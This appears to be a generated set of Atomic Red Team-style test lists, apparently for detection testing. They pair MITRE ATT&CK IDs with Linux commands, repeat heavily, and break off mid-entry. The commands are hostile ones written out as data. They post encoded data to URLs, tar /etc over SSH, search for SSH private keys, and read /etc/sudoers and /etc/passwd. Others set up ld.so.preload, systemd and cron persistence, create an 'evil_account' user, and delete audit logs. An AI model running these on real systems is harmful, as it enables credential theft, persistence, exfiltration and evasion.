tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1158 ,T1153 ,T1139 ,T1069 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1055 ,T1501 ,T1154 ,T1145 ,T1018 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1501 ,T1154 ,T1040 ,T1069 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1169 ,T1501 ,T1064 ,T1145 ,T1217 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1215 ,T1153 ,T1040 ,T1057 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1057: Utilize ps to identify processes.

Upon successful execution, sh will execute ps and output to /tmp/loot.txt. 
ps >> #{output_file}
ps aux >> #{output_file}


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1136 ,T1154 ,T1040 ,T1135 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1168 ,T1154 ,T1145 ,T1217 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1217: Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.
find / -path "*.mozilla/firefox/*/places.sqlite" -exec echo {} >> ~/output/firefox-bookmarks.txt \;


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1065 ,T1206 ,T1501 ,T1154 ,T1139 ,T1018 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1065: Testing uncommonly used port utilizing telnet.
telnet #{domain} #{port}


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1206 ,T1168 ,T1153 ,T1145 ,T1082 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1215 ,T1154 ,T1145 ,T1033 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1033: Identify System owner or users on an endpoint

Upon successful execution, sh will stdout list of usernames.
users >> ~/output/users.txt
w >> ~/output/users.txt
who >> ~/output/users.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1168 ,T1064 ,T1040 ,T1083 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1206 ,T1168 ,T1064 ,T1145 ,T1082 ,T0002 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1153 ,T1040 ,T1087 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1087: Enumerate all accounts by copying /etc/passwd to another file
cat /etc/passwd > #{output_file}


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

